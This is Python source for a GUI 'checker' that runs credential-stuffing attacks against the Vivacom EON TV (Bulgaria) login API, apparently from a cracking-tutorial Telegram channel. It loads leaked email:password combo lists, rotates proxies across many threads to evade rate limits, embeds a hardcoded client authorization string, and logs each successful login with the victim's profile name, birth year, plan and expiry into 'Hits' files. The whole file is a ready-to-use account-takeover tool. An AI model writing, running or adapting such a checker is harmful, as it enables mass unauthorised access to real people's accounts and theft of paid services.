import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, ttk, messagebox
import threading
import time
import os
import uuid
import base64
import hashlib
import json
import webbrowser
import queue
import datetime
import httpx
from colorama import Fore, Style, init

init(autoreset=True)

class EONChecker:
    def __init__(self, root):
        self.root = root
        self.root.title("Vivacom EON (Bulgarian) Checker | By Crackingtutorial03")
        self.root.geometry("650x500")
        self.root.resizable(False, False)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.combos = []
        self.proxies = []
        self.tasks = queue.Queue()
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self.hits = 0
        self.custom = 0
        self.retries = 0
        self.checked = 0
        self.start_time = None
        self.results_created = set()

        self.create_widgets()
        self.show_region_notice()

    def create_widgets(self):
        top_frame = ctk.CTkFrame(self.root, corner_radius=8)
        top_frame.pack(padx=10, pady=8, fill="x")

        self.load_combos_btn = ctk.CTkButton(top_frame, text="Load Combos", command=self.load_combos, width=110)
        self.load_combos_btn.grid(row=0, column=0, padx=6, pady=6)

        self.load_proxies_btn = ctk.CTkButton(top_frame, text="Load Proxies", command=self.load_proxies, width=110)
        self.load_proxies_btn.grid(row=0, column=1, padx=6, pady=6)

        self.start_btn = ctk.CTkButton(top_frame, text="Start", command=self.start, fg_color="#16a34a", width=90)
        self.start_btn.grid(row=0, column=2, padx=6, pady=6)

        self.stop_btn = ctk.CTkButton(top_frame, text="Stop", command=self.stop, fg_color="#dc2626", width=90)
        self.stop_btn.grid(row=0, column=3, padx=6, pady=6)

        self.credits_btn = ctk.CTkButton(top_frame, text="Credits", command=self.show_credits, width=90)
        self.credits_btn.grid(row=0, column=4, padx=6, pady=6)

        self.use_proxy = tk.BooleanVar(value=True)

        def toggle_proxy_color():
            if self.use_proxy.get():
                self.proxy_check.configure(fg_color="green", text_color="white")
            else:
                self.proxy_check.configure(fg_color="gray30", text_color="lightgray")

        self.proxy_check = ctk.CTkCheckBox(
            self.root,
            text="✔ Use Proxies",
            variable=self.use_proxy,
            onvalue=True,
            offvalue=False,
            font=("Consolas", 12, "bold"),
            command=toggle_proxy_color
        )
        self.proxy_check.pack(pady=4)

        toggle_proxy_color()

        bots_frame = ctk.CTkFrame(self.root, corner_radius=6)
        bots_frame.pack(padx=10, pady=(0,8), fill="x")

        bots_label = ctk.CTkLabel(bots_frame, text="Bots:")
        bots_label.grid(row=0, column=0, sticky="w", padx=(6,2), pady=6)

        self.bots_var = tk.IntVar(value=20)
        self.bots_spin = ttk.Spinbox(bots_frame, from_=10, to=50, textvariable=self.bots_var, width=6)
        self.bots_spin.grid(row=0, column=1, padx=(0,6), pady=6)

        stats_frame = ctk.CTkFrame(self.root, corner_radius=6)
        stats_frame.pack(padx=10, pady=(0,8), fill="x")

        self.stats_hits = tk.Label(stats_frame, text="Hits: 0", fg="lime", bg="#1a1a1a", font=("Consolas", 11, "bold"))
        self.stats_hits.pack(side="left", expand=True)

        self.stats_custom = tk.Label(stats_frame, text="Custom: 0", fg="orange", bg="#1a1a1a", font=("Consolas", 11, "bold"))
        self.stats_custom.pack(side="left", expand=True)

        self.stats_retries = tk.Label(stats_frame, text="Retries: 0", fg="magenta", bg="#1a1a1a", font=("Consolas", 11, "bold"))
        self.stats_retries.pack(side="left", expand=True)

        self.stats_checked = tk.Label(stats_frame, text="Checked: 0", fg="cyan", bg="#1a1a1a", font=("Consolas", 11, "bold"))
        self.stats_checked.pack(side="left", expand=True)

        self.stats_cpm = tk.Label(stats_frame, text="CPM: 0", fg="yellow", bg="#1a1a1a", font=("Consolas", 11, "bold"))
        self.stats_cpm.pack(side="left", expand=True)

        output_frame = tk.Frame(self.root, bg="#0b0b0b")
        output_frame.pack(padx=10, pady=(0, 8), fill="both", expand=True)

        self.output_box = tk.Text(
            output_frame,
            wrap="none",
            bg="#0b0b0b",
            fg="#d1fae5",
            insertbackground="white",
            state="disabled",
            font=("Consolas", 10),
            padx=6,
            pady=6
        )
        self.output_box.grid(row=0, column=0, sticky="nsew")

        yscroll = tk.Scrollbar(output_frame, orient="vertical", command=self.output_box.yview)
        yscroll.grid(row=0, column=1, sticky="ns")

        xscroll = tk.Scrollbar(output_frame, orient="horizontal", command=self.output_box.xview)
        xscroll.grid(row=1, column=0, sticky="ew")

        self.output_box.configure(yscrollcommand=yscroll.set, xscrollcommand=xscroll.set)

        output_frame.grid_rowconfigure(0, weight=1)
        output_frame.grid_columnconfigure(0, weight=1)

        progress_frame = ctk.CTkFrame(self.root, corner_radius=6)
        progress_frame.pack(padx=10, pady=(0,12), fill="x")

        self.progress = ttk.Progressbar(progress_frame, orient="horizontal", length=460, mode="determinate")
        self.progress.pack(pady=6)

    def show_region_notice(self):
        try:
            messagebox.showinfo(
                "Region Notice",
                "⚠️ This checker is for the Bulgarian EON TV region (Vivacom).\n\n"
                "Use BULGARIA-based combos only.\n"
                "Other regions will return HTTP 401 Unauthorized."
            )
        except Exception:
            pass

    def log(self, text, tag=None):
        self.output_box.configure(state="normal")
        self.output_box.insert("end", text + "\n")
        self.output_box.configure(state="disabled")
        self.output_box.see("end")

    def load_combos(self):
        path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if path:
            with open(path, "r", errors="ignore") as f:
                self.combos = [line.strip() for line in f if line.strip()]
            self.log(f"[+] Loaded {len(self.combos)} combos")
            for combo in self.combos:
                self.tasks.put(combo)

    def load_proxies(self):
        path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if path:
            with open(path, "r", errors="ignore") as f:
                lines = [line.strip() for line in f if line.strip()]
            parsed = []
            for raw in lines:
                parsed.append(raw)
            self.proxies = parsed
            self.log(f"[+] Loaded {len(self.proxies)} proxies")

    def stop(self):
        self.stop_flag.set()
        self.log("[!] Stop requested. Threads will exit shortly.")

    def start(self):
        if not self.combos:
            self.log("[!] No combos loaded")
            return
        self.stop_flag.clear()
        self.start_time = time.time()
        self.hits = 0
        self.custom = 0
        self.retries = 0
        self.checked = 0
        self.results_created.clear()
        threads = []
        bots = max(10, min(50, int(self.bots_var.get())))
        for _ in range(bots):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            threads.append(t)
        monitor = threading.Thread(target=self._monitor_threads, args=(threads,), daemon=True)
        monitor.start()

    def _monitor_threads(self, threads):
        while any(t.is_alive() for t in threads):
            if self.stop_flag.is_set():
                break
            self.update_stats_ui()
            time.sleep(0.5)
        self.update_stats_ui()

    def rotate_proxy(self):
        if not self.proxies:
            return None
        with self.lock:
            idx = self.checked % len(self.proxies)
            raw = self.proxies[idx]
        p = self.normalize_proxy(raw)
        return p

    def normalize_proxy(self, raw):
        if raw.startswith("http://") or raw.startswith("https://") or raw.startswith("socks5://") or raw.startswith("socks4://") or raw.startswith("socks5h://") or raw.startswith("socks4a://"):
            return raw
        if "://" in raw:
            return raw
        if "@" in raw and raw.count(":") >= 2:
            if raw.startswith("socks5") or raw.startswith("socks4"):
                return raw
            return "http://" + raw
        parts = raw.split(":")
        if len(parts) == 2:
            ip, port = parts
            return f"http://{ip}:{port}"
        if len(parts) == 4:
            ip, port, user, pw = parts
            return f"http://{user}:{pw}@{ip}:{port}"
        return raw

    def sha256_if_needed_for_username(self, username):
        u = username.strip()
        is_hex64 = len(u) == 64 and all(c in "0123456789abcdefABCDEF" for c in u)
        if "@" in u or not is_hex64:
            return hashlib.sha256(u.encode()).hexdigest().upper()
        return u

    def worker(self):
        while not self.tasks.empty() and not self.stop_flag.is_set():
            try:
                combo = self.tasks.get_nowait()
            except Exception:
                break
            try:
                if ":" not in combo:
                    with self.lock:
                        self.retries += 1
                        self.checked += 1
                    self.log(f"[RETRY] malformed combo: {combo}")
                    continue

                email, password = combo.split(":", 1)

                if self.use_proxy.get():
                    proxy = self.rotate_proxy()
                else:
                    proxy = None

                client_kwargs = {"http2": True, "timeout": 20}
                if proxy:
                    client_kwargs["proxy"] = proxy

                with httpx.Client(**client_kwargs) as client:
                    auth = "YjhkOWFkZTQtMTA5My00NmE3LWE0ZjctMGU0N2JlNDYzYzEwOjF3NGRtd3c4N3gxZTlsODllc3NxdmM4MXBpZHJxc2EwbGkxcnZhMjM="
                    username_field = self.sha256_if_needed_for_username(email)
                    password_field = password
                    device_number = "bf1f7d45-0a45-4fd9-9c2d-261fc8b297fb"

                    files = {
                        "username": (None, username_field),
                        "password": (None, password_field),
                        "device_number": (None, device_number)
                    }

                    post_headers = {
                        "Host": "api-web.vivacom-be.cdn.united.cloud",
                        "Connection": "keep-alive",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "Authorization": f"Basic {auth}",
                        "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
                        "sec-ch-ua-mobile": "?0",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Origin": "https://eon.tv",
                        "Referer": "https://eon.tv/",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept-Encoding": "gzip, deflate"
                    }
                    r = client.post("https://api-web.vivacom-be.cdn.united.cloud/oauth/token?grant_type=password", headers=post_headers, files=files)
                    if r.status_code == 200 and ("access_token" in r.text or "refresh_token" in r.text):
                        try:
                            j = r.json()
                        except Exception:
                            j = {}
                        tok1 = j.get("access_token")
                        rtk = j.get("refresh_token")
                        profile_id = j.get("active_profile_id")
                        expiry = j.get("key_valid_to", "")[:10]
                        refresh_success = False
                        if rtk:
                            files2 = {"profile_id": (None, str(profile_id))} if profile_id else {"profile_id": (None, "")}
                            r2 = client.post(f"https://api-web.vivacom-be.cdn.united.cloud/oauth/token?grant_type=refresh_token&refresh_token={rtk}", headers=post_headers, files=files2)
                            if r2.status_code == 200 and "access_token" in r2.text:
                                try:
                                    j2 = r2.json()
                                except Exception:
                                    j2 = {}
                                tok2 = j2.get("access_token")
                                if tok2:
                                    refresh_success = True
                                    get_headers = {
                                        "Host": "api-web.vivacom-be.cdn.united.cloud",
                                        "Connection": "keep-alive",
                                        "X-Ucp-Language": "bul",
                                        "sec-ch-ua-platform": "\"Windows\"",
                                        "Authorization": f"bearer {tok2}",
                                        "X-UCP-TIME-FORMAT": "timestamp",
                                        "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
                                        "sec-ch-ua-mobile": "?0",
                                        "X-Ucp-Theme-Mode": "ALL",
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
                                        "Accept": "application/json, text/plain, */*",
                                        "Origin": "https://eon.tv",
                                        "Sec-Fetch-Site": "cross-site",
                                        "Sec-Fetch-Mode": "cors",
                                        "Sec-Fetch-Dest": "empty",
                                        "Referer": "https://eon.tv/",
                                        "Accept-Language": "en-US,en;q=0.9",
                                        "Accept-Encoding": "gzip, deflate"
                                    }
                                    prof = {}
                                    house = {}
                                    vq = {}
                                    try:
                                        r_prof = client.get("https://api-web.vivacom-be.cdn.united.cloud/v1/profiles/me", headers=get_headers)
                                        if r_prof.status_code == 200:
                                            prof = r_prof.json()
                                        r_house = client.get("https://api-web.vivacom-be.cdn.united.cloud/v1/households", headers=get_headers)
                                        if r_house.status_code == 200:
                                            house = r_house.json()
                                        r_vq = client.get("https://api-web.vivacom-be.cdn.united.cloud/v1/videoquality", headers=get_headers)
                                        if r_vq.status_code == 200:
                                            vq = r_vq.json()
                                    except Exception:
                                        pass
                                    name = prof.get("profileName", "?")
                                    birth = prof.get("year", "?")
                                    pin = prof.get("pinProtected", "?")
                                    plan = house.get("packageName", "?")
                                    expiry_val = expiry or j.get("key_valid_to", "")[:10] or j2.get("key_valid_to", "")[:10]
                                    wifi_opts = []
                                    try:
                                        for o in vq.get("wifi", []):
                                            try:
                                                if int(o.get("maxvbr", 0)) > 0:
                                                    wifi_opts.append(o.get("option"))
                                            except Exception:
                                                pass
                                    except Exception:
                                        pass
                                    best_quality = "OFF"
                                    priority = ["HIGH", "MID", "LOW", "AUTO"]
                                    found = [w.upper() for w in wifi_opts]
                                    for p in priority:
                                        if p in found:
                                            best_quality = p
                                            break
                                    with self.lock:
                                        self.hits += 1
                                        self.checked += 1

                                    line = f"{email}:{password} | Name:{name} | DOB:{birth} | pinProtected:{pin} | Plan:{plan} | VideoQuality:{best_quality} | Expiry:{expiry_val}"
                                    self._save_result_once("Hits", line)
                                    self.log(f"[HIT] {line} | Telegram @Crackingtutorial03")

                                    try:
                                        from tkinter import messagebox
                                        messagebox.showinfo(
                                            "✅ HIT Found!",
                                            f"{email}:{password}\n\n"
                                            f"Name: {name}\n"
                                            f"DOB: {birth}\n"
                                            f"pinProtected: {pin}\n"
                                            f"Plan: {plan}\n"
                                            f"VideoQuality: {best_quality}\n"
                                            f"Expiry: {expiry_val}\n\n"
                                            f"AUTHOR Telegram: @Crackingtutorial03"
                                        )
                                    except Exception:
                                        pass
                                else:
                                    with self.lock:
                                        self.custom += 1
                                        self.checked += 1
                                    self._save_result_once("Custom", f"{email}:{password} | Custom")
                                    self.log(f"[CUSTOM] {email}:{password} | Custom")
                            else:
                                with self.lock:
                                    self.custom += 1
                                    self.checked += 1
                                self._save_result_once("Custom", f"{email}:{password} | Custom")
                                self.log(f"[CUSTOM] {email}:{password} | Custom")
                        else:
                            with self.lock:
                                self.custom += 1
                                self.checked += 1
                            self._save_result_once("Custom", f"{email}:{password} | Custom")
                            self.log(f"[CUSTOM] {email}:{password} | Custom")
                    else:
                        with self.lock:
                            self.checked += 1
                        if r.status_code in (429, 500, 501, 503, 403):
                            with self.lock:
                                self.retries += 1
                            self.log(f"[RETRY] {email}:{password} | HTTP {r.status_code}")
                        else:
                            self.log(f"[FAIL] {email}:{password} | HTTP {r.status_code}")
            except Exception as e:
                with self.lock:
                    self.retries += 1
                    self.checked += 1
                self.log(f"[RETRY] {combo} | {e}")
            finally:
                try:
                    self.update_stats_ui()
                except Exception:
                    pass

    def _save_result_once(self, typ, line):
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        folder = "Results"
        if typ not in self.results_created:
            os.makedirs(folder, exist_ok=True)
            self.results_created.add(typ)
        path = os.path.join(folder, f"{typ}_{ts}.txt")
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    def update_stats_ui(self):
        elapsed = max(time.time() - (self.start_time or time.time()), 1)
        cpm = int((self.checked / elapsed) * 60)

        self.stats_hits.config(text=f"Hits: {self.hits}")
        self.stats_custom.config(text=f"Custom: {self.custom}")
        self.stats_retries.config(text=f"Retries: {self.retries}")
        self.stats_checked.config(text=f"Checked: {self.checked}")
        self.stats_cpm.config(text=f"CPM: {cpm}")

        if self.combos:
            try:
                self.progress["maximum"] = len(self.combos)
                self.progress["value"] = min(self.checked, len(self.combos))
            except Exception:
                pass

    def show_credits(self):
        credits = tk.Toplevel(self.root)
        credits.title("Credits")
        credits.geometry("315x245")
        credits.configure(bg="black")
        try:
            credits.attributes("-alpha", 0.92)
        except Exception:
            pass
        tk.Label(credits, text="Made with ♥ @Crackingtutorial03", fg="cyan", bg="black", font=("Arial", 12, "bold")).pack(pady=8)
        link = tk.Label(credits, text="Telegram: https://t.me/@Crackingtutorial03", fg="light blue", bg="black", cursor="hand2")
        link.pack(pady=4)
        link.bind("<Button-1>", lambda e: webbrowser.open("https://t.me/@Crackingtutorial03"))
 
if __name__ == "__main__":
    root = ctk.CTk()
    app = EONChecker(root)
    root.mainloop()
